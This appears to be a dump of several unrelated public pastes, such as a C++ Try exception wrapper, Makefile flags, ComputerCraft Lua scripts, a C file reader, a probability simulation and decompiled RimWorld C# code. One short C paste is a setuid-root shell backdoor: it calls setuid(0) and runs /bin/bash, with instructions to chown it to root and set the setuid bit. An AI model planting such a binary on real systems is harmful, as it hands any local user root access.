    explicit Try(tag::Exception /*unused*/, U&& val)
        : ex_opt_(std::make_exception_ptr(std::forward<U>(val))) {
    }

    explicit Try(tag::Exception /*unused*/, std::exception_ptr&& ptr) : ex_opt_(std::move(ptr)) {
    }

    Try(const Try&) = delete;
    Try(Try&&) = delete;

    Try& operator=(const Try&) = delete;
    Try& operator=(Try&&) = delete;

    ~Try() = default;

    [[nodiscard]] bool IsFailed() const {
        return ex_opt_.has_value();
    }

    [[nodiscard]] const T& Value() const {
        if (!val_opt_.has_value() && !ex_opt_.has_value()) {
            throw std::runtime_error(""Object is empty"");
        }
        if (ex_opt_.has_value()) {
            Throw();
        }
        if (!val_opt_.has_value()) {
            throw std::runtime_error(""Object is empty"");
        }
        return val_opt_.value();
    }

    void Throw() const {
        if (!ex_opt_.has_value()) {
            throw std::runtime_error(""No exception"");
        }
        std::rethrow_exception(ex_opt_.value());
    }

   private:
    std::optional<T> val_opt_{};
    std::optional<std::exception_ptr> ex_opt_{};
};

template <>
class Try<void> {
   public:
    Try() = default;

    template <typename U>
    explicit Try(tag::Exception /*unused*/, U& e) : opt_(std::make_exception_ptr(e)) {
    }

    template <
        typename U, typename = typename std::enable_if<!std::is_same_v<U, std::exception_ptr>>>
    explicit Try(tag::Exception /*unused*/, U&& val)
        : opt_(std::make_exception_ptr(std::forward<U>(val))) {
    }

    explicit Try(tag::Exception /*unused*/, std::exception_ptr&& ptr) : opt_(std::move(ptr)) {
    }

    Try(const Try&) = delete;
    Try(Try&&) = delete;

    Try& operator=(const Try&) = delete;
    Try& operator=(Try&&) = delete;

    ~Try() = default;

    [[nodiscard]] bool IsFailed() const {
        return opt_.has_value();
    }

    void Throw() const {
        if (!opt_.has_value()) {
            throw std::runtime_error(""No exception"");
        }
        auto val = opt_.value();
        std::rethrow_exception(opt_.value());
    }

   private:
    std::optional<std::exception_ptr> opt_;
};

template <class Function, class... Args>
auto TryRun(Function func, Args&&... args) {
    using ReturnType = decltype(func(std::forward<Args>(args)...));

    try {
        if constexpr (std::is_same_v<ReturnType, void>) {
            func(std::forward<Args>(args)...);
            return Try<ReturnType>();
        } else {
            auto value = func(std::forward<Args>(args)...);
            return Try<ReturnType>(std::move(value));
        }
    } catch (const char* msg) {
        return Try<ReturnType>(tag::kEx, std::runtime_error(msg));
    } catch (int code) {
        return Try<ReturnType>(tag::kEx, std::system_error(code, std::generic_category()));
    } catch (std::exception& e) {
        return Try<ReturnType>(tag::kEx, std::current_exception());
    } catch (...) {
        return Try<ReturnType>(tag::kEx, std::runtime_error(""Unknown exception""));
    }
}

// NOLINTEND(cppcoreguidelines-pro-bounds-array-to-pointer-decay,hicpp-no-array-decay,bugprone-throw-keyword-missing)
"
u6RzjX8J,Untitled,KallazZ,C,Sunday 17th of December 2023 07:16:44 AM CDT,"#include <stdlib.h>

/*
    Before executing:
    sudo chown root:root a.out
    sudo chmod +s a.out
*/

int main(int argc, char **argv, char **envp) {
    char *command[] = {""bash"", NULL};

    setuid(0);
    execve(""/bin/bash"", command, envp);

    // This code will be executed if something goes wrong
    perror(""Error"");
    exit(1);
}"
sS9wU2v3,Untitled,feos,Make,Sunday 17th of December 2023 07:03:07 AM CDT,"  ALL_ASMFLAGS       += $(ASMFLAGS) $(CFLAGS) $(ALL_CPPFLAGS) $(ARCH) -m32 -pipe -O3 -fno-strict-aliasing -Wno-unknown-pragmas -Wall -Wcast-align -Wformat-security -Wundef -Wwrite-strings -Wno-conversion -Wno-sign-compare -Wno-error=deprecated-declarations -Wno-error=unused-result -Wno-array-bounds -Wno-error=attributes -Wno-stringop-truncation -Wno-stringop-overflow -Wno-nonnull -Wno-stringop-overread
  ALL_CFLAGS         += $(CFLAGS) $(ALL_CPPFLAGS) $(ARCH) -m32 -pipe -O3 -fno-strict-aliasing -Wno-unknown-pragmas -Wall -Wcast-align -Wformat-security -Wundef -Wwrite-strings -Wno-conversion -Wno-sign-compare -Wno-error=deprecated-declarations -Wno-error=unused-result -Wno-array-bounds -Wno-error=attributes -Wno-stringop-truncation -Wno-stringop-overflow -Wno-nonnull -Wno-stringop-overread -std=gnu99 -Wpointer-arith -Wstrict-prototypes -Wbad-function-cast
  ALL_CXXFLAGS       += $(CXXFLAGS) $(CFLAGS) $(ALL_CPPFLAGS) $(ARCH) -m32 -std=c++17 -pipe -O3 -fno-strict-aliasing -Wno-unknown-pragmas -Wall -Wcast-align -Wformat-security -Wundef -Wwrite-strings -Wno-conversion -Wno-sign-compare -Wno-error=deprecated-declarations -Wno-error=unused-result -Wno-array-bounds -Wno-error=attributes -Wno-stringop-truncation -Wno-stringop-overflow -Wno-nonnull -Wno-stringop-overread -std=c++17 -Woverloaded-virtual -Wvla -Wimplicit-fallthrough -Wno-class-memaccess -Wsuggest-override
  ALL_OBJCFLAGS      += $(CFLAGS) $(ALL_CPPFLAGS) $(ARCH) -m32 -pipe -O3 -fno-strict-aliasing -Wno-unknown-pragmas -Wall -Wcast-align -Wformat-security -Wundef -Wwrite-strings -Wno-conversion -Wno-sign-compare -Wno-error=deprecated-declarations -Wno-error=unused-result -Wno-array-bounds -Wno-error=attributes -Wno-stringop-truncation -Wno-stringop-overflow -Wno-nonnull -Wno-stringop-overread
  ALL_OBJCPPFLAGS    += $(CXXFLAGS) $(CFLAGS) $(ALL_CPPFLAGS) $(ARCH) -m32 -std=c++17 -pipe -O3 -fno-strict-aliasing -Wno-unknown-pragmas -Wall -Wcast-align -Wformat-security -Wundef -Wwrite-strings -Wno-conversion -Wno-sign-compare -Wno-error=deprecated-declarations -Wno-error=unused-result -Wno-array-bounds -Wno-error=attributes -Wno-stringop-truncation -Wno-stringop-overflow -Wno-nonnull -Wno-stringop-overread -std=c++17 -Wpointer-arith -Wimplicit-fallthrough"
wYuEQQqh,listitems.lua,Dragon_voyageur,Lua,Sunday 17th of December 2023 06:19:24 AM CDT,"
list={}

function countChests()
	chests={peripheral.find('inventory')}
    for i,chest in ipairs(chests) do
        items=chest.list()
        for     j,item in pairs(items) do
    
            if item==nil then break end
            name=item.name
            if list[name]==nil then list[name]=0 end
            list[name]=(list[name]+item.count)
        end
    end
end

function makeString(st,size)
    return string.sub(string.format((""%-""..tostring(size)..""s""),tostring(st)),1,size)
end

function thousend(count)
    v=count
    if (count/1000)>1 then
        v=string.sub(tostring(count),1,1)..""k""
    end
    return v
end

function itemlist()
    x=0
    for itna,itco in pairs(list) do
        write(makeString(thousend(itco),3)) 
        write(' ')
        write(makeString(string.match(itna, "":(.*)""),12))
        write(' ')
        if x>2 then
            print()
            x=0
        end
        x=x+1
    
    end
end

while true do
    countChests()
    itemlist()
    sleep(2)
    list={}
    term.setCursorPos(1,1)
end"
NFpytmBt,PlayerDetector,kk258966,Lua,Sunday 17th of December 2023 06:14:09 AM CDT,"local detector = peripheral.find(""playerDetector"")
if detector == nil then 
    error(""playerDetector not in range"") 
end 
function PlayerCheck() 
    return detector.isPlayersInRange(3)
end 
while true do 
 
    if PlayerCheck() == true then 
        redstone.setOutput(""top"",true) 
    else 
        redstone.setOutput(""top"", false) --This one just turns the redstone signal off so it's not kept on after the player leaves
        print(""Nope.\n"") 
    end 
sleep(0) 
end"
mbS03zzS,Es.ist.zu.deinem.Besten.2020.Deu.720p.h264.dts.Subs-bp,bpmircea,BrainFuck,Sunday 17th of December 2023 06:05:05 AM CDT,"Es ist zu deinem Besten (It's for Your Own Good) (Marc Rothemund, 2020)
aka
Es.ist.zu.deinem.Besten.2020.Deu.720p.h264.dts.Subs-bp
https://www.imdb.com/title/tt11570120/

Uploading..."
5GiftGWd,Es.ist.zu.deinem.Besten.2020.Dual.Deu.Spa.720p.h264.ac3.Subs-bp,bpmircea,BrainFuck,Sunday 17th of December 2023 06:03:53 AM CDT,"Es ist zu deinem Besten (It's for Your Own Good) (Marc Rothemund, 2020)
aka
Es.ist.zu.deinem.Besten.2020.Dual.Deu.Spa.720p.h264.ac3.Subs-bp
https://www.imdb.com/title/tt11570120/

Uploading..."
XGiGuxtK,data785,TestGuy1,JSON,Sunday 17th of December 2023 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'c7548b84d8a08d75de95159f0069cab3f69325026b84bcae2344de136b540a54dea0ce94ffbbff13b8532cf0345ecda86a7a04c3e22b312cd35ac51a24d8a074acccc8838c6b74adf4203b7a2500e69839479540b75294520ce42584da5117047dbf8d74f1f1ca90846d8d8084e9c50a747a2360aa2399b605e0b5f8e40eb319',
  otherdata: [
    'ce28e0bae33f1f1f2ea5fd744588063a',
    'aeeaa819bbf177bdc949eb8870a91282',
    'ad7fab53fc621af9abd338fad44ad82c',
    '49b0b3f04201d35ba1fd09ff435ba232',
    '3bb9e6d3e8855b36a94925c0102e2ae3',
    '3a984c6f4bcaa8a5b0818042ad79561e',
    '7b2ad06878bf9bb57d10aa6f214a13aa',
    'e64435366ae3f941e720b49256b3cca2'
  ]
}"
bVzA8E1v,Untitled,pasholnahuy,C,Sunday 17th of December 2023 05:10:51 AM CDT,"#include ""attachments/read_file.h""
#include <stdlib.h>
#include <unistd.h>

struct FileContent read_file(int fd) {
    struct FileContent result;
    char *buf = calloc(4096, 1);
    if (buf == NULL) {
        result.size = -1;
        result.data = NULL;
        return result;
    }
    char *cur_buf = buf;
    size_t file_size = 0;
    size_t file_capacity = 4096;
    ssize_t read_res = read(fd, cur_buf, file_capacity);
    while (read_res > 0) {
        file_size += read_res;
        cur_buf += read_res;
        if (file_size == file_capacity) {
            file_capacity <<= 1;
            char *new_buf = realloc(buf, file_capacity);
            if (new_buf == NULL) {
                free(buf);
                result.size = -1;
                result.data = NULL;
                return result;
            }
            buf = new_buf;
            cur_buf = buf + file_size;
        }
        read_res = read(fd, cur_buf, file_capacity - file_size);
    }

    if (read_res == 0) {
        *cur_buf = 0;
        result.size = file_size;
        result.data = buf;
        return result;
    } else {
        result.size = -1;
        result.data = NULL;
        return result;
    }
}

#include <fcntl.h>
#include <stdio.h>

int main(int argc, char *argv[]) {
    struct FileContent file_content = read_file(open(argv[1], O_RDONLY));
    printf(""%zu\n%s"", file_content.size, file_content.data);
    free(file_content.data);
}"
WrbDZFNf,Week15,excellent940707,C++,Sunday 17th of December 2023 05:10:19 AM CDT,"#include<bits/stdc++.h>
using namespace std;
int probability(){
    int n=471,cnt=0;
    for(int i=0;i<n;++i){
        if(rand()%10==0)cnt++;
    }
    return cnt;
}

int main(){
    srand(time(NULL));
    int t=10000000;
    int ssr=0, sr=0, r=0, n=0,others=0;
    for(int i=0;i<t;++i){
        int tmp=probability();
        if(tmp<=11)ssr+=1;
        else if(tmp<=20)sr+=1;
        else if(tmp<=30)r+=1;
        else if(tmp<=40)n+=1;
        else others+=1;

    }
    cout<<""The estimated prob. of winning <= 40 items:""<<(double)n/t<<'\n';
    cout<<""The estimated prob. of winning <= 30 items:""<<(double)r/t<<'\n';
    cout<<""The estimated prob. of winning <= 20 items:""<<(double)sr/t<<'\n';
    cout<<""The estimated prob. of being unlucky as the streamer (<=11 items):""<<(double)ssr/t<<'\n';

    return 0;
}"
ZkJth7MQ,Untitled,Kaedys,C#,Sunday 17th of December 2023 05:00:24 AM CDT,"		public void CheckForStateChange(DamageInfo? dinfo, Hediff hediff)
		{
			if (!this.Dead)
			{
				if (ModsConfig.BiotechActive && this.pawn.mechanitor != null)
				{
					this.pawn.mechanitor.Notify_HediffStateChange(hediff);
				}
				if (hediff != null && hediff.def.blocksSleeping && !this.pawn.Awake())
				{
					RestUtility.WakeUp(this.pawn);
					return;
				}
				if (this.ShouldBeDead())
				{
					if (this.ShouldBeDeathrestingOrInComa())
					{
						this.ForceDeathrestOrComa(dinfo, hediff);
						return;
					}
					if (!this.pawn.Destroyed)
					{
						this.pawn.Kill(dinfo, hediff);
						return;
					}
				}
				else if (!this.Downed)
				{
					if (this.ShouldBeDowned())
					{
						if (!this.forceDowned && dinfo != null && dinfo.Value.Def.ExternalViolenceFor(this.pawn) && !this.pawn.IsWildMan() && (this.pawn.Faction == null || !this.pawn.Faction.IsPlayer) && (this.pawn.HostFaction == null || !this.pawn.HostFaction.IsPlayer))
						{
							bool flag = ModsConfig.BiotechActive && this.pawn.genes != null && this.pawn.genes.HasGene(GeneDefOf.Deathless);
							float num;
							if (flag && this.pawn.Faction == Faction.OfPlayer)
							{
								num = 0f;
							}
							else if (this.pawn.RaceProps.Animal)
							{
								num = 0.5f;
							}
							else if (this.pawn.RaceProps.IsMechanoid)
							{
								num = 1f;
							}
							else
							{
								num = (Find.Storyteller.difficulty.unwaveringPrisoners ? HealthTuning.DeathOnDownedChance_NonColonyHumanlikeFromPopulationIntentCurve : HealthTuning.DeathOnDownedChance_NonColonyHumanlikeFromPopulationIntentCurve_WaveringPrisoners).Evaluate(StorytellerUtilityPopulation.PopulationIntent) * Find.Storyteller.difficulty.enemyDeathOnDownedChanceFactor;
							}
							if (Rand.Chance(num))
							{
								if (DebugViewSettings.logCauseOfDeath)
								{
									Log.Message(""CauseOfDeath: chance on downed "" + num.ToStringPercent());
								}
								if (flag && !this.pawn.Dead)
								{
									this.pawn.health.AddHediff(HediffDefOf.MissingBodyPart, this.pawn.health.hediffSet.GetBrain(), dinfo, null);
									return;
								}
								this.pawn.Kill(dinfo, null);
								return;
							}
						}
						this.forceDowned = false;
						this.MakeDowned(dinfo, hediff);
						return;
					}
					if (!this.capacities.CapableOf(PawnCapacityDefOf.Manipulation))
					{
						if (this.pawn.carryTracker != null && this.pawn.carryTracker.CarriedThing != null && this.pawn.jobs != null && this.pawn.CurJob != null)
						{
							this.pawn.jobs.EndCurrentJob(JobCondition.InterruptForced, true, true);
						}
						if (this.pawn.equipment != null && this.pawn.equipment.Primary != null)
						{
							if (this.pawn.kindDef.destroyGearOnDrop)
							{
								this.pawn.equipment.DestroyEquipment(this.pawn.equipment.Primary);
								return;
							}
							if (this.pawn.InContainerEnclosed)
							{
								this.pawn.equipment.TryTransferEquipmentToContainer(this.pawn.equipment.Primary, this.pawn.holdingOwner);
								return;
							}
							if (this.pawn.SpawnedOrAnyParentSpawned)
							{
								ThingWithComps thingWithComps;
								this.pawn.equipment.TryDropEquipment(this.pawn.equipment.Primary, out thingWithComps, this.pawn.PositionHeld, true);
								return;
							}
							if (!this.pawn.IsCaravanMember())
							{
								this.pawn.equipment.DestroyEquipment(this.pawn.equipment.Primary);
								return;
							}
							ThingWithComps primary = this.pawn.equipment.Primary;
							this.pawn.equipment.Remove(primary);
							if (!this.pawn.inventory.innerContainer.TryAdd(primary, true))
							{
								primary.Destroy(DestroyMode.Vanish);
								return;
							}
						}
					}
				}
				else if (!this.ShouldBeDowned())
				{
					this.MakeUndowned(hediff);
					return;
				}
			}
		}
"
